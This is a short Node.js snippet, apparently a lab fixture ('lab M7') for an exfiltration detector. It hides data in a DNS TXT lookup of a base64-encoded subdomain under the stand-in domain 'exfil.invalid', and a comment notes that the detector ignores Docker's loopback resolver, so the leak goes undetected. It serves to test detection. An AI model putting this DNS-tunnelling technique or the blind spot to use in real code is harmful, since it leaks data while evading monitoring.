// lab M7: hides data in a DNS lookup. The resolver is Docker's at 127.0.0.11
// (loopback), which the judge ignores, so this is an expected miss.
const dns = require("node:dns");
dns.resolveTxt("ZXhmaWw.exfil.invalid", () => {});
